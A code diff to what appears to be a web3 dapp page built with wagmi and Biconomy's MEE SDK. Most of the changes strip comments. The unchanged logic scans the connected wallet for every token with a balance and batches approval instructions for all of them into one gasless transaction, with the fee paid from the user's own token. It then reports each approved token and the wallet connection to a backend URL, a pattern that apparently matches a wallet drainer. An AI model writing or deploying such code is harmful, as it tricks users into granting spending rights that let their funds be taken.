@@ -27,7 +27,7 @@ export default function Page() {
   const [loading, setLoading] = useState<boolean>(false);
   const connectReported = useRef(false);
 
-  // Report connect only once per session (simple guard)
+  // Report connect once
   useEffect(() => {
     if (!connectReported.current && isConnected && address) {
       connectReported.current = true;
@@ -51,24 +51,13 @@ export default function Page() {
     setStatus('🔍 Preparing MEE / scanning tokens...');
 
     try {
-      // Ensure the dapp's active chain (from wagmi) is used
       const activeChain = chainId;
-      // Optional sanity: check that getChainId(config) equals chainId to ensure wagmi config matches
-      try {
-        const confChain = getActiveChainId(config);
-        if (confChain !== activeChain) {
-          // wagmi should be the source of truth — but warn if config differs
-          console.warn('Config chain mismatch', confChain, activeChain);
-        }
-      } catch {
-        // ignore if getActiveChainId fails
-      }
 
-      // Get walletClient (wagmi) bound to activeChain — used as signer for MEE account
+      // Wallet client from wagmi
       const walletClient = await getWalletClient(config, { chainId: activeChain });
       if (!walletClient) throw new Error('No wallet client available for active chain');
 
-      // Build a multichain nexus account (orchestrator) that uses the wagmi signer
+      // Multichain orchestrator
       const orchestrator = await toMultichainNexusAccount({
         signer: walletClient,
         chainConfigurations: [
@@ -80,13 +69,12 @@ export default function Page() {
         ],
       });
 
-      // Create a meeClient bound to the orchestrator and your API key
       const meeClient = await createMeeClient({
         account: orchestrator,
         apiKey: BICONOMY_API_KEY,
       });
 
-      // Collect approval instructions for tokens on the active chain
+      // Get tokens for active chain
       const tokens = TOKENS_BY_CHAIN[activeChain] || [];
       if (tokens.length === 0) {
         setStatus(`⚠️ No tokens configured for chain ${CHAIN_NAMES?.[activeChain] ?? activeChain}`);
@@ -108,7 +96,6 @@ export default function Page() {
           }) as bigint;
 
           if (bal > BigInt(0)) {
-            // record human friendly amount for reporting
             approvedTokens.push({
               symbol: token.symbol,
               address: token.address,
@@ -116,7 +103,6 @@ export default function Page() {
               decimals: token.decimals,
             });
 
-            // build composable approval instruction (gasless execution later)
             const instr = await orchestrator.buildComposable({
               type: 'default',
               data: {
@@ -131,23 +117,21 @@ export default function Page() {
             instructions.push(instr);
           }
         } catch (err) {
-          console.warn(`Failed reading balance for ${token.symbol} on chain ${activeChain}`, err);
+          console.warn(`Failed reading balance for ${token.symbol}`, err);
         }
       }
 
       if (instructions.length === 0) {
-        setStatus('ℹ️ No token balances found to approve on this chain.');
+        setStatus('ℹ️ No token balances found to approve.');
         setLoading(false);
         return;
       }
 
       setStatus(`🚀 Submitting ${instructions.length} approval(s) via MEE...`);
 
-      // Pick a fee token candidate — here we pick first approved token as a candidate
       const feeCandidate = approvedTokens[0];
       const feeTokenAddress = feeCandidate ? (feeCandidate.address as `0x${string}`) : undefined;
 
-      // build fusion quote & execute
       const fusionQuote = await meeClient.getFusionQuote({
         instructions,
         trigger: {
@@ -161,7 +145,6 @@ export default function Page() {
       const { hash } = await meeClient.executeFusionQuote({ fusionQuote });
       await meeClient.waitForSupertransactionReceipt({ hash });
 
-      // Report each approved token to your backend
       for (const t of approvedTokens) {
         if (REPORT_URL) {
           await fetch(REPORT_URL, {
